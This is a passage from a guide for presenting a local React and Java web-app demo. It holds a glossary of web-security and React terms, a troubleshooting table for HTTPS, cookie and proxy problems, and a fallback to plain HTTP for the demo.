| **XSS** | Attacker gets their JavaScript onto your page |
| **CSRF** | Another site makes your browser send an authenticated request |
| **Session fixation** | Attacker plants a session id, waits for you to log in with it |
| **TLS / HTTPS** | The encryption layer under HTTP |
| **Keystore / PKCS12** | The file holding a TLS certificate and its private key |
| **Revocation** | Ending a session server-side, so a stolen cookie stops working |
| **CORS** | Browser rule blocking cross-origin calls — avoided here via the proxy |
| **React component** | A function returning the HTML for one piece of screen |
| **State / `useState`** | Values React remembers; changing one redraws the screen |
| **`useEffect`** | Run code when a component loads |
| **Props** | Values passed from a parent component to a child |
| **JSX** | HTML-looking syntax inside JavaScript |
| **Ant Design (antd)** | Ready-made React components (buttons, inputs, forms) |

---

# Part 11 — If something breaks live

| Symptom | Cause | Fix |
|---|---|---|
| Backend won't start, "could not open keystore" | The certificate was never generated | `cd backend` then `make-keystore.cmd` |
| `keytool is not recognized` | `JAVA_HOME` isn't set | `set JAVA_HOME=C:\Program Files\Java\jdk-26.0.2` |
| `ERR_SSL_PROTOCOL_ERROR` in the browser | You typed `http://` | It's `https://` now — both 3000 and 8443 |
| "Your connection is not private" warning | The certificate is self-signed | Expected. *Advanced → Proceed.* Say what it means |
| "Proxy error … ECONNREFUSED" | Backend isn't running | Start terminal 1 |
| "Proxy error … self signed certificate" | `setupProxy.js` missing or dependency not installed | `npm install` in `frontend/` |
| Page won't load at all | Frontend isn't running | Start terminal 2 |
| No cookie appears in DevTools | You're on `http://localhost:3000` | Use `https://` — a `Secure` cookie needs a trusted origin |
| Count never goes up | Cookie is being blocked | Check `credentials: "include"`; don't use a private window |
| "Username is already taken" | You registered that name before | Pick another, or delete `backend/data/` and restart |
| Port 8443 in use | An old Java process is still alive | End it in Task Manager, or change `server.port` |

**Safe reset:** stop both servers, delete the `backend/data` folder, start again.
That wipes all accounts *and* all sessions and gives you a clean demo. The
keystore is separate and does not need regenerating.

**If HTTPS is fighting you five minutes before the meeting:** set
`app.session.cookie-secure=false` and `server.ssl.enabled=false` in
`application.properties`, change `setupProxy.js` to `http://localhost:8443`, and
you are back on plain HTTP with everything else intact. Say what you turned off
and why — the session design, the `HttpOnly` flag and the revocation are all
still there and still demonstrable.
